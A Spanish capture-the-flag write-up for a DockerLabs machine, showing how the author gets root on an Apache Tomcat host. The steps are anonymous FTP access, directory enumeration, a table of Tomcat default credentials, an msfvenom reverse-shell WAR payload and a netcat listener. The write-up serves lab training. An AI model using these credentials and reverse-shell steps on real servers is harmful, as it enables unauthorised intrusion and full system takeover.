#-Pn DockerLabs - 14/05/2024

#web - https://dockerlabs.es/#/

Realizamos un escaneo con nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 00:13 CEST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:13 (0:00:06 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 00:13 (0:00:00 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.79% done; ETC: 00:13 (0:00:00 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 00:13 (0:00:00 remaining)
Nmap scan report for 172.17.0.2
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
8080/tcp open  http    Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
|_http-favicon: Apache Tomcat
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
```

Vemos que podemos acceder al servidor ftp sin contraseña.
Entramos y encontramos un fichero ".txt":

```shell
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```shell
ftp> get tomcat.txt
local: tomcat.txt remote: tomcat.txt
229 Entering Extended Passive Mode (|||11583|)
150 Opening BINARY mode data connection for tomcat.txt (74 bytes).
100% |*|    74        1.10 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (169.24 KiB/s)
```


```shell
└─$ cat tomcat.txt 
Hello tomcat, can you configure the tomcat server? I lost the password...

```

Bueno... nada interesante seguimos, antes de entrar a la página web haremos un escaneo de subdominios con gobuster:

```shell
└─$ gobuster dir -u "http://172.17.0.2:8080/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 841]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 841]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 841]
/http%3A%2F%2Fblog    (Status: 400) [Size: 841]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 841]
/External%5CX-News    (Status: 400) [Size: 795]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 841]
/http%3A%2F%2Fradar   (Status: 400) [Size: 841]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 841]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 841]
/http%3A%2F%2Fswik    (Status: 400) [Size: 841]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Tampoco nada interesante... Probaremos a entrar en la pagina web..
Entrando en "http://172.17.0.2:8080/" encontramos una pagina de Apache Tomcat version 9.0.88.
Si nos fijamos bien podemos encontrar un panel de login:


![Captura de pantalla 2024-05-15 005242](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/45b0b2bf-4bd1-4a4f-988c-6191a990fc90)
![Captura de pantalla 2024-05-15 010522](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/dafa213a-5a85-4fb5-920a-e7e2e5426951)


# Apache Tomcat Default Credentials

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |
|admin        |tomcat    |
|both         |tomcat    |
|manager      |manager   |
|role1        |role1     |
|role1        |tomcat    |
|role         |changethis|
|root         |Password1 |
|root         |changethis|
|root         |password  |
|root         |password1 |
|root         |r00t      |
|root         |root      |
|root         |toor      |
|tomcat       |tomcat    |
|tomcat       |s3cret    |
|tomcat       |password1 |
|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|

Entramos y encontramos un apartado donde podemos subir archivos ".war".
Entramos a "https://revshells.com/" y buscamos la opcion de archivo .war con msfvenom:

```shell
msfvenom -p java/shell_reverse_tcp LHOST=127.17.0.2 LPORT=9001 -f war -o shell.war
```

![Captura de pantalla 2024-05-15 005818](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/8ac19833-b7f8-4ef5-bf61-4fbb78176212)

Abrimos un puerto de escucha con netcat:

```shell
nc -lvnp 9001
```

Lo subimos y lo llamamos:

![Captura de pantalla 2024-05-15 010324](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/a2b89848-d5b9-4110-b001-cf057ac5a903)
![Captura de pantalla 2024-05-15 010345](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/13592867-97e0-44cb-b8f1-11548b626743)


Y ahora tenemos control y con todos los permisos:

```shell
#whoami
root
```
